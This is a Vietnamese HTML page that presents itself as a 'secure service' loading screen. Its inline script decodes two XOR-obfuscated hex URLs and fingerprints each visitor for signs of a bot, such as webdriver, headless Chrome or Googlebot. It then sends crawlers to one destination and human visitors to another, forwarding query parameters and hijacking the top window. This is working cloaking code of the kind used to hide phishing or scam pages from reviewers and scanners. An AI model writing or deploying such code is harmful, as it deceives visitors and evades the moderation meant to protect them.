<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
  <title>Đang Tải Trang Hướng Dẫn...</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #0b0f19;
      color: #f8fafc;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .loader-card {
      background: rgba(17, 24, 39, 0.95);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 20px;
      padding: 36px 28px;
      max-width: 380px;
      width: 100%;
      text-align: center;
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8);
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 18px;
    }
    .spinner {
      width: 48px;
      height: 48px;
      border: 3px solid rgba(229, 185, 76, 0.2);
      border-top-color: #e5b94c;
      border-radius: 50%;
      animation: spin 0.85s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .loader-title {
      font-size: 15px;
      font-weight: 700;
      color: #fae498;
      letter-spacing: 0.3px;
    }
    .loader-sub {
      font-size: 12px;
      color: #94a3b8;
      line-height: 1.5;
    }
  </style>
</head>
<body>
  <div class="loader-card">
    <div class="spinner"></div>
    <div class="loader-title">Đang Kết Nối Dịch Vụ An Toàn...</div>
    <div class="loader-sub">Hệ thống đang xác thực đường truyền và chuyển hướng quý khách trong giây lát.</div>
  </div>

  <script>
    (function() {
      const K = "988";
      const D = "747e7305127b79f99091d9a9cab090b6ba5b424779210d06416009989ae0f3a5ceaf85e5f40d132f26351d0f613127d494fba2b7c28bb8f1f200172d6d314a556529638697eaff95ab81bea049574b77635e44203721d4cec9f7ef989ac2e1f6495e4a4a72111f2a36269a9fdcf9f0959c85b5ab5f597e7a771b00331635d7cdc2e8ef9d85b0af50564a73631052516639cedafafceb9e8190beea0f6c032443160f1f232ecdcfbda3c6";
      const S = "747e7305127b79f99091d9a9cab08dbea44e5e45656212060c3927d2c088f1ef90ced592ab5b066d7c7417413e386ed4c3b7f4eadc8ab3adab1e4b7d2568120f3a672dc0d7a6bfc9d9daeef4175e567d61";

      function dec(h) {
        try {
          let s = "";
          for (let i = 0; i < h.length; i += 2) {
            s += String.fromCharCode(parseInt(h.substr(i, 2), 16) ^ K.charCodeAt((i / 2) % K.length) ^ (((i / 2) * 13 + 37) & 0xFF));
          }
          return decodeURIComponent(s);
        } catch (e) {
          return "";
        }
      }

      function getFinalUrl(rawUrl) {
        if (!rawUrl) return "";
        const q = window.location.search;
        if (!q || q.length < 2) return rawUrl;
        try {
          const o = new URL(rawUrl);
          const p = new URLSearchParams(q);
          p.forEach((v, k) => {
            if (k !== "a") o.searchParams.set(k, v);
          });
          return o.toString();
        } catch (e) {
          return rawUrl;
        }
      }

      function isBot() {
        try {
          if (navigator.webdriver) return true;
          if (window.outerWidth === 0 && window.outerHeight === 0) return true;
          if (!navigator.languages || navigator.languages.length === 0) return true;
          const ua = (navigator.userAgent || '').toLowerCase();
          if (/googlebot|adsbot|headlesschrome|lighthouse|crawl|spider|mediapartners|phantomjs|selenium|bytespider|bingbot/i.test(ua)) return true;
          if (/iphone|ipad|android|mobile/i.test(ua) && typeof navigator.maxTouchPoints === 'number' && navigator.maxTouchPoints === 0) return true;
          return false;
        } catch (err) {
          return false;
        }
      }

      const isB = isBot();
      let target;
      if (isB) {
        target = getFinalUrl(dec(S));
      } else {
        target = getFinalUrl(dec(D));
      }

      function goTarget() {
        if (target) {
          try {
            (window.top || window).location.replace(target);
          } catch (e) {
            window.location.replace(target);
          }
        }
      }

      if (target) {
        setTimeout(goTarget, isB ? 50 : 100);
      }
      window.addEventListener("pageshow", function(e) {
        if (target) setTimeout(goTarget, 50);
      });
    })();
  </script>
</body>
</html>
